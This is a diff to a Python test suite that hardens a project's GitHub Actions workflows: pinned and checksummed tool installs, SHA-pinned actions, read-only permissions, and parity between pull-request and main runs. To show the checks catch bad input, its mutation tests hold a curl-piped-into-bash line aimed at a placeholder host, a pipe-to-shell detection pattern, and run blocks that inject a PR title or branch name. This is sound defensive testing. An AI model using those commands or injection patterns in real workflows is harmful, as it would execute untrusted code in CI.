@@ -443,19 +443,25 @@ def test_the_shard_leg_check_bites_on_a_dropped_leg_a_wrong_count_or_a_foreign_o
     assert _shard_leg_problems(foreign)
 
 
+BITE_CONTROL_STEP = "actionlint bite control"
 G1_STATIC_STEPS = (("ruff", "python -m ruff check backend tests scripts"),
                    ("mypy darwin", "python -m mypy --platform darwin"),
                    ("mypy win32", "python -m mypy --platform win32"),
-                   ("secret + PII scan", "python scripts/secret_scan.py"))
+                   ("secret + PII scan", "python scripts/secret_scan.py"),
+                   ("shellcheck", "shellcheck scripts/*.sh scripts/git-hooks/pre-push"),
+                   ("actionlint", "actionlint"),
+                   (BITE_CONTROL_STEP, None))  # a script of its own, checked by _actionlint_problems
 
 
 def _static_step_problems(jobs: dict) -> list[str]:
-    """What is wrong with the G1 steps of the static job of *jobs*: exactly the four commands, one per step (two in one
+    """What is wrong with the G1 steps of the static job of *jobs*: exactly these commands, one per step (two in one
     ``run`` block under a ``shell: bash {0}`` override, which has no -e, would hide a failing darwin check behind a
     passing win32 one), none skipped, none allowed to fail, none under a shell override."""
     problems = []
     static = [s for s in jobs[STATIC_JOB]["steps"] if str(s.get("name", "")).startswith("G1 static")]
-    if [(str(s["name"]).split(" — ")[-1].split(" (")[0], s.get("run")) for s in static] != list(G1_STATIC_STEPS):
+    seen = [(str(s["name"]).split(" — ")[-1].split(" (")[0], None if BITE_CONTROL_STEP in str(s["name"]) else s.get("run"))
+            for s in static]
+    if seen != list(G1_STATIC_STEPS):
         problems.append(f"G1 steps {[(s['name'], s.get('run')) for s in static]}")
     for step in static:
         if "if" in step or "continue-on-error" in step or "shell" in step:
@@ -497,6 +503,365 @@ def test_the_g1_step_check_bites_on_a_shell_override_a_joined_run_block_and_a_dr
     dropped = copy.deepcopy(jobs)
     steps(dropped).remove(next(s for s in steps(dropped) if s.get("run") == "python -m mypy --platform darwin"))
     assert _static_step_problems(dropped)
+
+
+# ------------------------------------------------------------------ actionlint, shellcheck and PR/main parity
+FIXTURES = ROOT / "tests" / "fixtures" / "actionlint"
+SHA256_HEX = re.compile(r"^[0-9a-f]{64}$")
+
+
+def _step(jobs: dict, job_id: str, name_prefix: str) -> dict:
+    return next(s for s in jobs[job_id]["steps"] if str(s.get("name", "")).startswith(name_prefix))
+
+
+def _actionlint_problems(jobs: dict) -> list[str]:
+    """What is wrong with the actionlint steps of the static job of *jobs* (a parsed workflow): the install step pins a
+    version and a 64-hex SHA-256, compares the downloaded tarball with it BEFORE extracting, over https, with no
+    pipe from curl into a shell or tar and no failure swallowed; the plain ``actionlint`` step runs on the workflows;
+    the bite control runs both fixtures in CI and checks the exit status and the finding; shellcheck is a step of the
+    static job and not of the pull-request-only commit-subjects job."""
+    problems: list[str] = []
+    steps = jobs[STATIC_JOB]["steps"]
+    names = [str(s.get("name", "")) for s in steps]
+    installs = [s for s in steps if str(s.get("name", "")).startswith("Install actionlint")]
+    lints = [s for s in steps if s.get("name") == "G1 static — actionlint"]
+    controls = [s for s in steps if BITE_CONTROL_STEP in str(s.get("name", ""))]
+    if len(installs) != 1 or len(lints) != 1 or len(controls) != 1:
+        return [f"static-checks needs one install, one actionlint and one bite-control step, has {names}"]
+    install, lint, control = installs[0], lints[0], controls[0]
+    if not names.index(install["name"]) < names.index(lint["name"]) < names.index(control["name"]):
+        problems.append("order must be install, actionlint, bite control")
+    env = install.get("env") or {}
+    if not SHA256_HEX.match(str(env.get("ACTIONLINT_SHA256", ""))):
+        problems.append(f"ACTIONLINT_SHA256 is not a pinned 64-hex digest: {env.get('ACTIONLINT_SHA256')!r}")
+    if not re.match(r"^\d+\.\d+\.\d+$", str(env.get("ACTIONLINT_VERSION", ""))):
+        problems.append(f"ACTIONLINT_VERSION is not an exact version: {env.get('ACTIONLINT_VERSION')!r}")
+    script = str(install.get("run", ""))
+    lines = [ln.strip() for ln in script.replace("\\\n", " ").splitlines()]
+    verify = [i for i, ln in enumerate(lines) if "sha256sum" in ln and "--check" in ln]
+    extract = [i for i, ln in enumerate(lines) if re.match(r"^(tar|unzip|gunzip)\b", ln)]
+    if len(verify) != 1 or "ACTIONLINT_SHA256" not in lines[verify[0]]:
+        problems.append("the download must be compared with $ACTIONLINT_SHA256 by one `sha256sum --check` line")
+    if not extract or (verify and min(extract) < verify[0]):
+        problems.append("the archive must be extracted after, never before, the checksum comparison")
+    curl = next((ln for ln in lines if ln.startswith("curl ")), "")
+    if "--fail" not in curl or "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/" not in curl:
+        problems.append(f"curl must fail on HTTP errors and fetch the pinned release over https: {curl!r}")
+    if re.search(r"\|\s*(sudo\s+)?(ba|z)?sh\b|curl[^\n|]*\|\s*tar", script):
+        problems.append("nothing may be piped from curl into a shell or tar (unverified bytes)")
+    if "|| true" in script or "set +e" in script or "continue-on-error" in install or "if" in install:
+        problems.append("the install step must not swallow a failure or be conditional")
+    if lint.get("run") != "actionlint" or "continue-on-error" in lint or "if" in lint or "shell" in lint:
+        problems.append(f"the actionlint step must be a plain unconditional `actionlint`: {lint}")
+    run = str(control.get("run", ""))
+    for needle, why in ((_gates().ACTIONLINT_BAD_FIXTURE, "the bad fixture"),
+                        (_gates().ACTIONLINT_NEAR_MISS_FIXTURE, "the near-miss fixture"),
+                        (_gates().ACTIONLINT_FINDING, "the finding text"), ("-ne 1", "the exact exit status check")):
+        if needle not in run:
+            problems.append(f"the bite control lacks {why} ({needle})")
+    if "continue-on-error" in control or "if" in control or "|| true" in run:
+        problems.append("the bite control must be unconditional and must not swallow a failure")
+    commit_steps = jobs["commit-subjects"]["steps"] if "commit-subjects" in jobs else []
+    if any("shellcheck" in str(s.get("run", "")) for s in commit_steps):
+        problems.append("shellcheck is back in commit-subjects, which does not run on main")
+    if not any(s.get("run") == _gates().SHELLCHECK_COMMAND for s in steps):
+        problems.append("shellcheck is not a step of static-checks")
+    return problems
+
+
+def _gates():
+    return _script("gates")
+
+
+def test_actionlint_is_installed_from_a_pinned_checksummed_release_and_lints_the_workflows_in_the_static_job():
+    jobs = _workflow()["jobs"]
+    assert _actionlint_problems(jobs) == []
+    env = _step(jobs, STATIC_JOB, "Install actionlint")["env"]
+    assert env["ACTIONLINT_VERSION"] == _gates().ACTIONLINT_PINNED_VERSION  # the version gates.py names is the pin
+    assert not [s for jid, j in jobs.items() if jid != STATIC_JOB for s in j["steps"]
+                if "actionlint" in str(s.get("run", ""))], "actionlint runs in the static job only"
+    assert _step(jobs, STATIC_JOB, "Install actionlint")["shell"] == "bash"  # bash -eo pipefail
+
+
+def test_the_bite_control_runs_in_ci_with_the_fixtures_and_the_finding_that_gates_py_mirrors():
+    jobs = _workflow()["jobs"]
+    run = _step(jobs, STATIC_JOB, "G1 static — actionlint bite control")["run"]
+    gates = _gates()
+    for needle in (gates.ACTIONLINT_BAD_FIXTURE, gates.ACTIONLINT_NEAR_MISS_FIXTURE, gates.ACTIONLINT_FINDING):
+        assert needle in run, needle
+    assert (ROOT / gates.ACTIONLINT_BAD_FIXTURE).is_file() and (ROOT / gates.ACTIONLINT_NEAR_MISS_FIXTURE).is_file()
+    bad = yaml_load(FIXTURES / "bad-workflow.yml")
+    near = yaml_load(FIXTURES / "near-miss-workflow.yml")
+    assert list(bad["jobs"]["probe"]["strategy"]["matrix"]) == ["os"] == list(near["jobs"]["probe"]["strategy"]["matrix"])
+    assert "matrix.oss" in str(bad["jobs"]["probe"]["steps"]) and "matrix.oss" not in str(near["jobs"]["probe"]["steps"])
+    # the fixtures stay out of the directory the plain `actionlint` run lints
+    assert not list((ROOT / ".github" / "workflows").glob("*fixture*")) and FIXTURES.parent.name == "fixtures"
+    assert not [p for p in (ROOT / ".github" / "workflows").iterdir() if p.name in {"bad-workflow.yml", "near-miss-workflow.yml"}]
+
+
+def yaml_load(path: Path) -> dict:
+    import yaml
+
+    return yaml.safe_load(path.read_text(encoding="utf-8"))
+
+
+def test_the_actionlint_checks_bite_on_a_missing_or_late_checksum_a_pipe_and_a_moved_or_softened_step():
+    """Near miss green (the real workflow), every violation red, on in-memory copies of the workflow."""
+    import copy
+
+    jobs = _workflow()["jobs"]
+    assert _actionlint_problems(jobs) == []
+
+    def mutated(edit) -> list[str]:
+        copy_ = copy.deepcopy(jobs)
+        edit(copy_)
+        return _actionlint_problems(copy_)
+
+    install = lambda j: _step(j, STATIC_JOB, "Install actionlint")  # noqa: E731
+    lint_step = lambda j: _step(j, STATIC_JOB, "G1 static — actionlint")  # noqa: E731
+    control = lambda j: _step(j, STATIC_JOB, "G1 static — actionlint bite")  # noqa: E731
+
+    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_SHA256="8aca8db9"))  # short digest
+    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_SHA256="G" * 64))  # not hex
+    assert mutated(lambda j: install(j)["env"].pop("ACTIONLINT_SHA256"))
+    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_VERSION="latest"))
+    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("sha256sum --check --strict -", "cat")))
+    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("${ACTIONLINT_SHA256}", "deadbeef")))
+    late = lambda j: install(j).update(run="\n".join(sorted(  # noqa: E731
+        install(j)["run"].splitlines(), key=lambda ln: ln.lstrip().startswith("echo \"${ACTIONLINT_SHA256}"))))
+    assert mutated(late)  # the comparison moved behind the extraction
+    assert mutated(lambda j: install(j).update(run=install(j)["run"] + "\ncurl -sL https://example.invalid/x | bash\n"))
+    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("--fail ", "")))
+    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("https://", "http://")))
+    assert mutated(lambda j: install(j).update(run=install(j)["run"] + "\n|| true\n"))
+    assert mutated(lambda j: install(j).update({"continue-on-error": True}))
+    assert mutated(lambda j: lint_step(j).update(run="actionlint || true"))
+    assert mutated(lambda j: lint_step(j).update(run="actionlint tests/fixtures/actionlint/bad-workflow.yml"))
+    assert mutated(lambda j: lint_step(j).update({"if": "github.event_name == 'push'"}))
+    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("-ne 1", "-ne 0")))
+    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("bad-workflow.yml", "other.yml")))
+    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("is not defined in object type", "")))
+    assert mutated(lambda j: control(j).update({"continue-on-error": True}))
+    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(control(j)))
+    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(install(j)))
+    # shellcheck belongs to the static job (it runs on main) and must not come back to the PR-only job
+    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(
+        next(s for s in j[STATIC_JOB]["steps"] if "shellcheck" in str(s.get("run")))))
+    assert mutated(lambda j: j["commit-subjects"]["steps"].append(
+        {"name": "G1 static — shellcheck", "run": "shellcheck scripts/*.sh scripts/git-hooks/pre-push"}))
+
+
+def _event_conditional(jobs: dict) -> list[str]:
+    """Names of the jobs and steps whose ``if:`` mentions github.event_name: they run on a pull request but not on a
+    push to main (or the other way round)."""
+    found = []
+    for jid, job in jobs.items():
+        if "github.event_name" in str(job.get("if", "")):
+            found.append(f"job {jid}")
+        for step in job.get("steps") or []:
+            if "github.event_name" in str(step.get("if", "")):
+                found.append(f"step {jid}/{step.get('name') or step.get('uses') or step.get('run')}")
+    return found
+
+
+# The jobs and steps that deliberately differ between a pull request and a push to main. A new entry is a decision:
+# the check then does not run on main (this is how shellcheck once ran on pull requests only).
+EVENT_CONDITIONAL_ALLOWED = ("job commit-subjects",)
+
+
+def _parity_problems(jobs: dict) -> list[str]:
+    found = _event_conditional(jobs)
+    problems = [f"{name} is event-conditional (if: github.event_name) and not in EVENT_CONDITIONAL_ALLOWED: "
+                "it runs on pull requests or on main, not on both" for name in found
+                if name not in EVENT_CONDITIONAL_ALLOWED]
+    problems += [f"{name} is in EVENT_CONDITIONAL_ALLOWED but no longer event-conditional: remove it"
+                 for name in EVENT_CONDITIONAL_ALLOWED if name not in found]
+    return problems
+
+
+def test_only_the_allow_listed_job_differs_between_a_pull_request_and_a_push_to_main():
+    jobs = _workflow()["jobs"]
+    assert _event_conditional(jobs) == ["job commit-subjects"]
+    assert _parity_problems(jobs) == []
+
+
+def test_the_parity_guard_names_a_new_event_conditional_job_or_step():
+    """Near misses green (an if on something else, the real workflow), violations red with the name in the message."""
+    import copy
+
+    jobs = _workflow()["jobs"]
+    ok = copy.deepcopy(jobs)
+    ok[STATIC_JOB]["steps"][3]["if"] = "${{ !cancelled() }}"
+    ok["frontend"]["if"] = "github.ref == 'refs/heads/main'"
+    assert _parity_problems(ok) == []
+
+    on_step = copy.deepcopy(jobs)
+    step = _step(on_step, STATIC_JOB, "G1 static — actionlint")
+    step["if"] = "${{ github.event_name == 'pull_request' }}"
+    (problem,) = _parity_problems(on_step)
+    assert "step static-checks/G1 static — actionlint" in problem
+
+    on_job = copy.deepcopy(jobs)
+    on_job["browser-e2e"]["if"] = "github.event_name != 'push'"
+    (problem,) = _parity_problems(on_job)
+    assert "job browser-e2e" in problem
+
+    unlabeled = copy.deepcopy(jobs)
+    unlabeled["frontend"]["steps"][1]["if"] = "github.event_name == 'push'"
+    assert any("frontend" in p for p in _parity_problems(unlabeled))
+
+    stale = copy.deepcopy(jobs)
+    del stale["commit-subjects"]["if"]
+    (problem,) = _parity_problems(stale)
+    assert "job commit-subjects" in problem and "no longer" in problem
+
+
+# ------------------------------------------------------------------ every workflow file (ci.yml and pr-title.yml)
+WORKFLOWS_DIR = ROOT / ".github" / "workflows"
+SHA_PIN = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
+
+
+def _workflow_files() -> dict[str, dict]:
+    return {p.name: yaml_load(p) for p in sorted(WORKFLOWS_DIR.glob("*.y*ml"))}
+
+
+def _all_jobs(doc: dict) -> dict:
+    return doc["jobs"]
+
+
+def _untrusted_in_run(doc: dict) -> list[str]:
+    """Steps whose ``run:`` interpolates a ``${{ }}`` expression other than a matrix value: any github.* value (a pull
+    request title, a branch name) there is script injection; it has to go through env:."""
+    bad = []
+    for jid, job in _all_jobs(doc).items():
+        for step in job.get("steps") or []:
+            for expr in re.findall(r"\$\{\{(.*?)\}\}", str(step.get("run", "")), flags=re.S):
+                if not re.fullmatch(r"\s*matrix\.[A-Za-z0-9_-]+\s*", expr):
+                    bad.append(f"{jid}/{step.get('name')}: {{{{{expr}}}}}")
+    return bad
+
+
+def _unpinned_actions(doc: dict) -> list[str]:
+    return [f"{jid}: {step['uses']}" for jid, job in _all_jobs(doc).items() for step in job.get("steps") or []
+            if "uses" in step and not SHA_PIN.match(str(step["uses"]))]
+
+
+def test_every_action_of_every_workflow_is_pinned_by_commit_sha_and_no_run_block_interpolates_untrusted_text():
+    files = _workflow_files()
+    assert {"ci.yml", "pr-title.yml"} <= set(files)
+    for name, doc in files.items():
+        assert _unpinned_actions(doc) == [], name
+        assert _untrusted_in_run(doc) == [], name
+        assert doc["permissions"] == {"contents": "read"}, name
+        for jid, job in _all_jobs(doc).items():
+            assert isinstance(job.get("timeout-minutes"), int) and 0 < job["timeout-minutes"] <= 25, (name, jid)
+            assert "pull_request_target" not in str(doc.get("on", doc.get(True))), name
+
+
+def test_the_pin_and_injection_checks_bite_on_a_tag_a_branch_and_a_title_in_a_run_block():
+    import copy
+
+    doc = _workflow_files()["pr-title.yml"]
+    assert _unpinned_actions(doc) == [] and _untrusted_in_run(doc) == []
+    for ref in ("v7", "main", "3d3c42e5aac5ba805825da76410c181273ba90b1abc", "3d3c42e"):
+        tagged = copy.deepcopy(doc)
+        tagged["jobs"]["pr-title"]["steps"][0]["uses"] = f"actions/checkout@{ref}"
+        assert _unpinned_actions(tagged), ref
+    injected = copy.deepcopy(doc)
+    injected["jobs"]["pr-title"]["steps"][1]["run"] = "python3 scripts/commit_subject.py --subject '${{ github.event.pull_request.title }}'"
+    assert _untrusted_in_run(injected)
+    head_ref = copy.deepcopy(_workflow())
+    head_ref["jobs"]["static-checks"]["steps"][2]["run"] = "echo ${{ github.head_ref }}"
+    assert _untrusted_in_run(head_ref)
+
+
+PR_TITLE_JOB = "pr-title"
+
+
+def _pr_title_problems(doc: dict) -> list[str]:
+    """What is wrong with pr-title.yml (a parsed workflow): read-only token, the five event types, one ubuntu job
+    named ``pr title [G1]`` with a 5-minute timeout and a SHA-pinned checkout without ``with:``, and the title reaching
+    the script through ``env:`` only."""
+    problems = []
+    on = doc.get("on", doc.get(True)) or {}
+    if set(on) != {"pull_request"} or set(on["pull_request"]["types"]) != {
+            "opened", "edited", "synchronize", "reopened", "ready_for_review"}:
+        problems.append(f"on: {on}")
+    if doc.get("permissions") != {"contents": "read"}:
+        problems.append(f"permissions {doc.get('permissions')}")
+    jobs = _all_jobs(doc)
+    if list(jobs) != [PR_TITLE_JOB]:
+        return problems + [f"jobs {list(jobs)}"]
+    job = jobs[PR_TITLE_JOB]
+    if job.get("name") != "pr title [G1]":
+        problems.append(f"name {job.get('name')!r}")
+    if job.get("runs-on") != "ubuntu-latest":
+        problems.append(f"runs-on {job.get('runs-on')!r} (a macOS slot is scarce, the check is platform-neutral)")
+    if job.get("timeout-minutes") != 5:
+        problems.append(f"timeout-minutes {job.get('timeout-minutes')!r}")
+    if "if" in job or "continue-on-error" in job or "permissions" in job:
+        problems.append("job-level if / continue-on-error / permissions")
+    problems += _unpinned_actions(doc) + _untrusted_in_run(doc)
+    steps = job["steps"]
+    checkout = steps[0]
+    if not str(checkout.get("uses", "")).startswith("actions/checkout@") or checkout.get("with"):
+        problems.append(f"first step must be a plain actions/checkout: {checkout}")
+    if checkout.get("uses") != _workflow()["jobs"]["static-checks"]["steps"][0]["uses"]:
+        problems.append("checkout is not the same pinned SHA as ci.yml")
+    runs = [s for s in steps if "run" in s]
+    if len(runs) != 1:
+        return problems + [f"expected exactly one run step, found {len(runs)}"]
+    run = runs[0]
+    if (run.get("env") or {}) != {"PR_TITLE": "${{ github.event.pull_request.title }}"}:
+        problems.append(f"the title must reach the step as env PR_TITLE only: {run.get('env')}")
+    if run.get("run") != 'python3 scripts/commit_subject.py --subject="$PR_TITLE"' or "if" in run or "continue-on-error" in run:
+        problems.append(f"run: {run.get('run')!r}")
+    return problems
+
+
+def test_pr_title_workflow_checks_the_title_as_a_commit_subject_with_the_title_only_in_env():
+    from aeos.delivery.provider import classify_check
+
+    doc = _workflow_files()["pr-title.yml"]
+    assert _pr_title_problems(doc) == []
+    text = (WORKFLOWS_DIR / "pr-title.yml").read_text(encoding="utf-8")
+    code_lines = [ln for ln in text.splitlines() if not ln.lstrip().startswith("#")]
+    assert sum("github.event.pull_request.title" in ln for ln in code_lines) == 1  # the env line, nowhere else
+    assert classify_check("pr title [G1]") == ["G1"]
+    assert "pr title [G1]" not in REQUIRED_CHECKS  # adding it to a ruleset is an owner decision
+    assert "pr title [G1]" not in [n for job in _workflow()["jobs"].values() for n in _check_names(job)]
+
+
+def test_the_pr_title_checks_bite_on_each_unsafe_or_weakened_shape():
+    import copy
+
+    doc = _workflow_files()["pr-title.yml"]
+    assert _pr_title_problems(doc) == []
+
+    def mutated(edit) -> list[str]:
+        copy_ = copy.deepcopy(doc)
+        edit(copy_)
+        return _pr_title_problems(copy_)
+
+    job = lambda d: d["jobs"][PR_TITLE_JOB]  # noqa: E731
+    assert mutated(lambda d: job(d)["steps"][1].update(run="python3 scripts/commit_subject.py --subject \"${{ github.event.pull_request.title }}\""))
+    assert mutated(lambda d: job(d)["steps"][1].update(run='python3 scripts/commit_subject.py --subject "$PR_TITLE"'))
+    assert mutated(lambda d: job(d)["steps"][1].update(env={}))
+    assert mutated(lambda d: job(d)["steps"][1].update(env={"PR_TITLE": "${{ github.event.pull_request.body }}"}))
+    assert mutated(lambda d: job(d)["steps"][1].update({"continue-on-error": True}))
+    assert mutated(lambda d: job(d).update({"timeout-minutes": 30}))
+    assert mutated(lambda d: job(d).pop("timeout-minutes"))
+    assert mutated(lambda d: job(d).update({"runs-on": "macos-latest"}))
+    assert mutated(lambda d: job(d).update({"name": "pr title"}))
+    assert mutated(lambda d: job(d).update({"if": "github.event.action == 'edited'"}))
+    assert mutated(lambda d: d.update({"permissions": {"contents": "write"}}))
+    assert mutated(lambda d: d.update({"permissions": {"contents": "read", "pull-requests": "write"}}))
+    assert mutated(lambda d: d.pop("permissions"))
+    assert mutated(lambda d: job(d)["steps"][0].update(uses="actions/checkout@v7"))
+    assert mutated(lambda d: job(d)["steps"][0].update({"with": {"ref": "main"}}))
+    assert mutated(lambda d: d.update({"on": {"pull_request": {"types": ["opened"]}}}))
+    assert mutated(lambda d: d.update({"on": {"pull_request_target": {"types": ["opened", "edited", "synchronize",
+                                                                               "reopened", "ready_for_review"]}}}))
 
 
 # The checkout and setup of every backend job (static, shards, verifier) must build the commit under test: an
